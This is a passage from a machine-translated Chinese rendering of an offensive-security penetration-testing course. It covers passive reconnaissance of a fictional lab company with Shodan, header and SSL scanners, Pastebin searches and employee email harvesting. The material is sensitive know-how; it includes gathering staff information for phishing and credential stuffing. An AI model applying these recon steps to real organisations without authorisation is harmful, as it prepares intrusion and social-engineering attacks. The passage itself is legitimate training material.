<div style="position:absolute;top:188027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索连接到 Internet 的设备、与它们交互并显示有关它们的信息。</font></font></nobr></div>
<div style="position:absolute;top:188060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然 Shodan 不需要完成本模块或实验室中的任何材料，但它是值得的</font></font></nobr></div>
<div style="position:absolute;top:188079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">探索了一下。</font><font style="vertical-align: inherit;">在使用 Shodan 之前，我们必须注册一个免费帐户，该帐户提供有限的</font></font></nobr></div>
<div style="position:absolute;top:188099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用权。</font></font></nobr></div>
<div style="position:absolute;top:188132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们从使用 Shodan 搜索</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hostname:megacorpone.com 开始</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:188594;left:290"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 34：使用 Shodan 搜索 MegaCorp One 的域</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:188626;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，Shodan 会列出 IP、服务和横幅信息。</font><font style="vertical-align: inherit;">这一切都是被动收集的</font></font></nobr></div>
<div style="position:absolute;top:188645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无需与客户的网站进行交互。</font></font></nobr></div>
<div style="position:absolute;top:188677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些信息为我们提供了目标互联网足迹的快照。</font><font style="vertical-align: inherit;">例如，有八个</font></font></nobr></div>
<div style="position:absolute;top:188697;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器上运行SSH，我们可以向下钻取此通过点击来改进我们的结果</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下</font></font></nobr></div>
<div style="position:absolute;top:188716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">顶级服务。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:189067;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="160"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 160 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:189100;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:190177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:190177;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:190177;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">160</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:189640;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 35：运行 SSH 的 MegaCorp One 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:189671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据 Shodan 的结果，我们确切地知道每个服务器上运行的是哪个版本的 OpenSSH。</font></font></nobr></div>
<div style="position:absolute;top:189690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们点击一​​个 IP 地址，我们可以检索主机的摘要。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:190255;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="161"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 161 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:190288;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:191365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:191365;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:191365;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">161</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:190907;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 36：Shodan 主机摘要</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:190938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以在此页面查看服务器使用的端口、服务和技术。</font><font style="vertical-align: inherit;">Shodan也会</font></font></nobr></div>
<div style="position:absolute;top:190957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">揭示任何已识别的服务或技术是否存在任何已发布的漏洞。</font></font></nobr></div>
<div style="position:absolute;top:190977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们转向主动测试时，在确定从哪里开始时，此信息非常宝贵。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:191014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.9 安全头扫描器</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:191056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以使用其他几个专业网站来收集有关网站的信息</font></font></nobr></div>
<div style="position:absolute;top:191075;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或域的安全状况。</font><font style="vertical-align: inherit;">其中一些网站模糊了被动和主动之间的界限</font></font></nobr></div>
<div style="position:absolute;top:191094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息收集，但我们目的的关键是第三方正在启动任何扫描</font></font></nobr></div>
<div style="position:absolute;top:191114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或检查。</font></font></nobr></div>
<div style="position:absolute;top:191147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个这样的网站，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Security头</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">167</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将分析HTTP响应头，并提供基本的分析</font></font></nobr></div>
<div style="position:absolute;top:191166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标站点的安全态势。</font><font style="vertical-align: inherit;">我们可以使用它来了解组织的编码和</font></font></nobr></div>
<div style="position:absolute;top:191185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于结果的安全实践。</font></font></nobr></div>
<div style="position:absolute;top:191218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们扫描 www.megacorpone.com 并检查结果：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:191315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">167 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（斯科特·赫尔姆，2019 年），https://securityheaders.com/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:191443;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="162"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 162 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:191476;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:192553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:192553;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:192553;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">162</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:191969;left:311"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 37：www.megacorpone.com 的扫描结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:192000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该站点缺少几个防御性标头，例如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Content-Security-Policy </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">168</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">X-Frame-</font></font></i></nobr></div>
<div style="position:absolute;top:192019;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">169</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些缺失的标头本身并不一定是漏洞，但它们</font></font></nobr></div>
<div style="position:absolute;top:192039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能表示不熟悉</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器强化的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 开发人员或服务器管理员</font><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">170</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:192101;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器强化或安全配置是确保安全的整个过程</font></font></i></nobr></div>
<div style="position:absolute;top:192120;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器通过配置。</font><font style="vertical-align: inherit;">这包括禁用不需要的服务，</font></font></i></nobr></div>
<div style="position:absolute;top:192140;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">删除未使用的服务或用户帐户、轮换默认密码、设置</font></font></i></nobr></div>
<div style="position:absolute;top:192159;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适当的服务器标头，等等。</font><font style="vertical-align: inherit;">我们不需要知道所有的内幕和</font></font></i></nobr></div>
<div style="position:absolute;top:192178;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置每种类型的服务器，但了解概念和</font></font></i></nobr></div>
<div style="position:absolute;top:192197;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在分析服务器以确定如何最好地</font></font></i></nobr></div>
<div style="position:absolute;top:192217;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接近潜在目标。</font></font></i></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:192279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.10 SSL 服务器测试</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:192321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用的另一个扫描工具是</font><font style="vertical-align: inherit;">Qualys SSL Labs</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSL Server Test</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">171</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个工具</font></font></nobr></div>
<div style="position:absolute;top:192340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分析服务器的 SSL/TLS 配置并将其与当前最佳实践进行比较。</font><font style="vertical-align: inherit;">它会</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:192443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">168 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/Content_Security_Policy</font></font></font></nobr></div>
<div style="position:absolute;top:192463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">169 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Mozilla，2019，https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</font></font></font></nobr></div>
<div style="position:absolute;top:192483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">170 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（NIST，2019 年），https://csrc.nist.gov/publications/detail/sp/800-123/final</font></font></font></nobr></div>
<div style="position:absolute;top:192503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">171 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Qualys，2019 年），https://www.ssllabs.com/ssltest/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:192631;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="163"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 163 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:192664;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:193741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:193741;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:193741;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">163</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:192760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还识别一些与 SSL/TLS 相关的漏洞，例如 Poodle </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">172</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或 Heartbleed。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">173</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫一扫</font></font></nobr></div>
<div style="position:absolute;top:192779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www.megacorpone.com 并查看结果：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:193209;left:280"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 38：www.megacorpone.com 的 SSL 服务器测试结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:193240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果并不像安全标头检查那么糟糕。</font><font style="vertical-align: inherit;">然而，弱的 Diffie-Hellman 键</font></font></nobr></div>
<div style="position:absolute;top:193259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交换、RC4 密码和缺乏前向保密表明我们的目标没有应用当前最好的</font></font></nobr></div>
<div style="position:absolute;top:193279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSL/TLS 强化实践。</font><font style="vertical-align: inherit;">例如，建议禁用 RC4 密码</font></font></nobr></div>
<div style="position:absolute;top:193298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数年</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">174</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于多个漏洞。</font><font style="vertical-align: inherit;">我们可以使用这些发现来深入了解</font></font></nobr></div>
<div style="position:absolute;top:193318;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标组织内的安全实践，或缺乏安全实践。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:193355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.11 粘贴箱</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:193397;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pastebin </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">175</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个用于存储和共享文本的网站。</font><font style="vertical-align: inherit;">该网站不需要基本帐户</font></font></nobr></div>
<div style="position:absolute;top:193416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法。</font><font style="vertical-align: inherit;">许多人使用 Pastebin 是因为它无处不在且易于使用。</font><font style="vertical-align: inherit;">但由于 Pastebin 是</font></font></nobr></div>
<div style="position:absolute;top:193436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一项公共服务，我们可以用它来搜索敏感信息。</font></font></nobr></div>
<div style="position:absolute;top:193468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们可以使用网站进行基本搜索，或者使用 API 进行更高级的使用。</font></font></nobr></div>
<div style="position:absolute;top:193487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们搜索 megacorpone.com：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:193617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">172 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/POODLE</font></font></font></nobr></div>
<div style="position:absolute;top:193637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">173 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/Heartbleed</font></font></font></nobr></div>
<div style="position:absolute;top:193657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">174 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软安全响应中心，2013 年），https://msrc-blog.microsoft.com/2013/11/12/security-advisory-2868725-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:193672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">建议禁用-rc4/</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:193691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">175 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Pastebin, 2019), https://pastebin.com/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:193819;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="164"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 164 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:193852;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:194929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:194929;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:194929;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">164</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:194300;left:374"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 39：搜索 Pastebin</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:194331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果只有十个，但有些看起来很眼熟。</font><font style="vertical-align: inherit;">我们可能找不到任何新的</font></font></nobr></div>
<div style="position:absolute;top:194350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MegaCorp One 上的信息，但我们不应该忽视在未来搜索 Pastebin</font></font></nobr></div>
<div style="position:absolute;top:194370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息收集工作。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:194407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.12 用户信息收集</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:194449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了收集有关目标组织资源的信息外，我们还可以收集</font></font></nobr></div>
<div style="position:absolute;top:194468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关组织员工的信息。</font><font style="vertical-align: inherit;">我们收集这些信息的目的是为了</font></font></nobr></div>
<div style="position:absolute;top:194487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编译用户或密码列表，为社会工程构建借口，增强网络钓鱼</font></font></nobr></div>
<div style="position:absolute;top:194507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动或客户端攻击、执行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭证填充</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">176</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等等。</font><font style="vertical-align: inherit;">然而，规则</font></font></nobr></div>
<div style="position:absolute;top:194526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参与度因每次渗透测试而异。</font><font style="vertical-align: inherit;">一些渗透测试可能仅限于纯粹</font></font></nobr></div>
<div style="position:absolute;top:194545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有任何社会工程方面的技术测试。</font><font style="vertical-align: inherit;">其他参与可能很少或没有</font></font></nobr></div>
<div style="position:absolute;top:194565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">限制。</font></font></nobr></div>
<div style="position:absolute;top:194598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下面的一些方法将与前面几节已经讨论过的方法重叠，但是</font></font></nobr></div>
<div style="position:absolute;top:194617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将深入研究一些特定于用户枚举的工具。</font></font></nobr></div>
<div style="position:absolute;top:194650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们开始收集用户信息时，我们确实需要谨慎行事。</font><font style="vertical-align: inherit;">正如我们</font></font></nobr></div>
<div style="position:absolute;top:194669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块介绍中我们关于“大卫”的故事中提到，我们的目标是提高客户的</font></font></nobr></div>
<div style="position:absolute;top:194688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全态势，不一定要让任何一个人被炒鱿鱼。</font><font style="vertical-align: inherit;">同样，我们不想破坏任何</font></font></nobr></div>
<div style="position:absolute;top:194708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">法律。</font><font style="vertical-align: inherit;">公司只能授权针对他们自己的系统进行测试。</font><font style="vertical-align: inherit;">员工的个人设备，</font></font></nobr></div>
<div style="position:absolute;top:194727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第三方电子邮件和社交媒体帐户通常不在此授权范围内。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:194879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">176 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/Credential_stuffing</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:195007;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="165"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 165 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:195040;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:196117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:196117;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:196117;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">165</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:195136;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.12.1</font></font></i></nobr></div>
<div style="position:absolute;top:195136;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电子邮件收集</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:195174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们从一些基本的电子邮件收集开始我们的用户信息收集。</font><font style="vertical-align: inherit;">在这种情况下，我们将</font></font></nobr></div>
<div style="position:absolute;top:195193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">theHarvester</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">177</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收集来自多个公共的电子邮件、名称、子域、IP 和 URL</font></font></nobr></div>
<div style="position:absolute;top:195212;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据源。</font></font></nobr></div>
